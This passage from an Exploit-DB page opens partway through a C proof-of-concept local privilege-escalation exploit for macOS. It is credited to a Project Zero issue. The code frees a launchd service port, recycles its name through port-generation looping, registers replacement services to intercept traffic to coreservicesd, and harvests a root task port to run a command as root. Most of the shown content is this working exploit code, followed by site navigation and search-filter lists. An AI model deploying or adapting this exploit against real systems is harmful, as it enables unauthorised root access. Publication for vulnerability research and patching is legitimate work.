  free_msg->hdr.msgh_id = msgh_id_to_get_destroyed;

  free_msg->body.msgh_descriptor_count = 1;

  free_msg->ool_ports.address = ports;
  free_msg->ool_ports.count = port_count;
  free_msg->ool_ports.deallocate = 0;
  free_msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
  free_msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
  free_msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

  // send the free message
  err = mach_msg(&free_msg->hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  printf("free message: %s\n", mach_error_string(err));
}

void send_looper(mach_port_t service, mach_port_t* ports, uint32_t n_ports, int disposition) {
  kern_return_t err;
  struct ool_msg msg = {0};
  msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
  msg.hdr.msgh_size = sizeof(msg);
  msg.hdr.msgh_remote_port = service;
  msg.hdr.msgh_local_port = MACH_PORT_NULL;
  msg.hdr.msgh_id = msgh_id_to_get_destroyed;

  msg.body.msgh_descriptor_count = 1;

  msg.ool_ports.address = (void*)ports;
  msg.ool_ports.count = n_ports;
  msg.ool_ports.disposition = disposition;
  msg.ool_ports.deallocate = 0;
  msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

  err = mach_msg(&msg.hdr,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(struct ool_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  printf("sending looper: %s\n", mach_error_string(err));

  // need to wait a little bit since we don't send a reply port and don't want to fill the queue
  usleep(100);
}

mach_port_right_t right_fixup(mach_port_right_t in) {
  switch (in) {
    case MACH_MSG_TYPE_PORT_SEND:
      return MACH_MSG_TYPE_MOVE_SEND;
    case MACH_MSG_TYPE_PORT_SEND_ONCE:
      return MACH_MSG_TYPE_MOVE_SEND_ONCE;
    case MACH_MSG_TYPE_PORT_RECEIVE:
      return MACH_MSG_TYPE_MOVE_RECEIVE;
    default:
      return 0; // no rights
  }
}

int ran_command = 0;

void inspect_port(mach_port_t port) {
  pid_t pid = 0;
  pid_for_task(port, &pid);
  if (pid != 0) {
    printf("got task port for pid: %d\n", pid);
  }
	// find the uid
  int proc_err;
  struct proc_bsdshortinfo info = {0};
  proc_err = proc_pidinfo(pid, PROC_PIDT_SHORTBSDINFO, 0, &info, sizeof(info));
  if (proc_err <= 0) {
    // fail
    printf("proc_pidinfo failed\n");
    return;
  }

	if (info.pbsi_uid == 0) {
		printf("got r00t!! ******************\n");
    printf("(via task port for: %s)\n", info.pbsi_comm);
	  if (!ran_command) {
      run_command(port, "echo hello > /tmp/hello_from_root");
      ran_command = 1;
    }
  }

  return;
}

/*
implements the mitm
replacer_portset contains receive rights for all the ports we send to launchd
to replace the real service port

real_service_port is a send-right to the actual service

receive messages on replacer_portset, inspect them, then fix them up and send them along
to the real service
*/
void do_service_mitm(mach_port_t real_service_port, mach_port_t replacer_portset) {
  size_t max_request_size = 0x10000;
	mach_msg_header_t* request = malloc(max_request_size);

  for(;;) {
    memset(request, 0, max_request_size);
    kern_return_t err = mach_msg(request,
                                 MACH_RCV_MSG |
                                 MACH_RCV_LARGE, // leave larger messages in the queue
                                 0,
                                 max_request_size,
                                 replacer_portset,
                                 0,
                                 0);

    if (err == MACH_RCV_TOO_LARGE) {
      // bump up the buffer size
      mach_msg_size_t new_size = request->msgh_size + 0x1000;
      request = realloc(request, new_size);
      // try to receive again
      continue;
    }

    if (err != KERN_SUCCESS) {
      printf("error receiving on port set: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }

    printf("got a request, fixing it up...\n");

    // fix up the message such that it can be forwarded:

    // get the rights we were sent for each port the header
    mach_port_right_t remote = MACH_MSGH_BITS_REMOTE(request->msgh_bits);
    mach_port_right_t voucher = MACH_MSGH_BITS_VOUCHER(request->msgh_bits);

    // fixup the header ports:
    // swap the remote port we received into the local port we'll forward
    // this means we're only mitm'ing in one direction - we could also
    // intercept these replies if necessary
    request->msgh_local_port = request->msgh_remote_port;
    request->msgh_remote_port = real_service_port;
    // voucher port stays the same

    int is_complex = MACH_MSGH_BITS_IS_COMPLEX(request->msgh_bits);

    // (remote, local, voucher)
    request->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_COPY_SEND, right_fixup(remote), right_fixup(voucher));

    if (is_complex) {
      request->msgh_bits |= MACH_MSGH_BITS_COMPLEX;

      // if it's complex we also need to fixup all the descriptors...
      mach_msg_body_t* body = (mach_msg_body_t*)(request+1);
      mach_msg_type_descriptor_t* desc = (mach_msg_type_descriptor_t*)(body+1);
      for (mach_msg_size_t i = 0; i < body->msgh_descriptor_count; i++) {
        switch (desc->type) {
          case MACH_MSG_PORT_DESCRIPTOR: {
            mach_msg_port_descriptor_t* port_desc = (mach_msg_port_descriptor_t*)desc;
            inspect_port(port_desc->name);
            port_desc->disposition = right_fixup(port_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(port_desc+1);
            break;
          }
          case MACH_MSG_OOL_DESCRIPTOR: {
            mach_msg_ool_descriptor_t* ool_desc = (mach_msg_ool_descriptor_t*)desc;
            // make sure that deallocate is true; we don't want to keep this memory:
            ool_desc->deallocate = 1;
            desc = (mach_msg_type_descriptor_t*)(ool_desc+1);
            break;
          }
          case MACH_MSG_OOL_VOLATILE_DESCRIPTOR:
          case MACH_MSG_OOL_PORTS_DESCRIPTOR: {
            mach_msg_ool_ports_descriptor_t* ool_ports_desc = (mach_msg_ool_ports_descriptor_t*)desc;
            // make sure that deallocate is true:
            ool_ports_desc->deallocate = 1;
            ool_ports_desc->disposition = right_fixup(ool_ports_desc->disposition);
            desc = (mach_msg_type_descriptor_t*)(ool_ports_desc+1);
            break;
          }
        }
      }

    }

    printf("fixed up request, forwarding it\n");

    // forward the message:
    err = mach_msg(request,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   request->msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);

    if (err != KERN_SUCCESS) {
      printf("error forwarding service message: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }

}

void lookup_and_ping_service(char* name) {
  mach_port_t service_port = lookup(name);
  if (service_port == MACH_PORT_NULL) {
    printf("failed too lookup %s\n", name);
    return;
  }
  // send a ping message to make sure the service actually gets launched:
  kern_return_t err;
  mach_msg_header_t basic_msg;

  basic_msg.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
  basic_msg.msgh_size        = sizeof(basic_msg);
  basic_msg.msgh_remote_port = service_port;
  basic_msg.msgh_local_port  = MACH_PORT_NULL;
  basic_msg.msgh_reserved    = 0;
  basic_msg.msgh_id          = 0x41414141;

  err = mach_msg(&basic_msg,
                 MACH_SEND_MSG,
                 sizeof(basic_msg),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  if (err != KERN_SUCCESS) {
    printf("failed to send ping message to service %s (err: %s)\n", name, mach_error_string(err));
    return;
  }

  printf("pinged %s\n", name);
}

void* do_lookups(void* arg) {
  lookup_and_ping_service("com.apple.storeaccountd");
  lookup_and_ping_service("com.apple.hidfud");
  lookup_and_ping_service("com.apple.netauth.sys.gui");
  lookup_and_ping_service("com.apple.netauth.user.gui");
  lookup_and_ping_service("com.apple.avbdeviced");
  return NULL;
}

void start_root_lookups_thread() {
  pthread_t thread;
  pthread_create(&thread, NULL, do_lookups, NULL);
}

char* default_target_service_name = "com.apple.CoreServices.coreservicesd";

int main(int argc, char** argv) {
  char* target_service_name = default_target_service_name;
  if (argc > 1) {
    target_service_name = argv[1];
  }

	// allocate the receive rights which we will try to replace the service with:
	// (we'll also use them to loop the mach port name in the target)
	size_t n_ports = 0x1000;
  mach_port_t* ports = calloc(sizeof(void*), n_ports);
  for (int i = 0; i < n_ports; i++) {
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    if (err != KERN_SUCCESS) {
      printf("failed to allocate port: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
		err = mach_port_insert_right(mach_task_self(),
							 ports[i],
							 ports[i],
							 MACH_MSG_TYPE_MAKE_SEND);
    if (err != KERN_SUCCESS) {
      printf("failed to insert send right: %s\n", mach_error_string(err));
      exit(EXIT_FAILURE);
    }
  }

	// generate some service names we can use:
	char** names = calloc(sizeof(char*), n_ports);
  for (int i = 0; i < n_ports; i++) {
    char name[64];
    sprintf(name, "replacer.%d", i);
    names[i] = strdup(name);
  }

  // lookup a send right to the target to be replaced
  mach_port_t target_service = lookup(target_service_name);

  // free the target in launchd
  do_free(bootstrap_port, target_service);

  // send one smaller looper message to push the free'd name down the free list:
  send_looper(bootstrap_port, ports, 0x100, MACH_MSG_TYPE_MAKE_SEND);

  // send the larger ones to loop the generation number whilst leaving the name in the middle of the long freelist
  for (int i = 0; i < 62; i++) {
    send_looper(bootstrap_port, ports, 0x200, MACH_MSG_TYPE_MAKE_SEND);
  }

	// now that the name should have looped round (and still be near the middle of the freelist
  // try to replace it by registering a lot of new services
  for (int i = 0; i < n_ports; i++) {
    kern_return_t err = bootstrap_register(bootstrap_port, names[i], ports[i]);
    if (err != KERN_SUCCESS) {
      printf("failed to register service %d, continuing anyway...\n", i);
    }
  }

  // add all those receive rights to a port set:
  mach_port_t ps;
  mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_PORT_SET, &ps);
  for (int i = 0; i < n_ports; i++) {
    mach_port_move_member(mach_task_self(), ports[i], ps);
  }

  start_root_lookups_thread();

	do_service_mitm(target_service, ps);
  return 0;
}

```

**Tags:**
[Local](/?tag=22)

**Advisory/Source:**
[Link](https://bugs.chromium.org/p/project-zero/issues/detail?id=959)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search


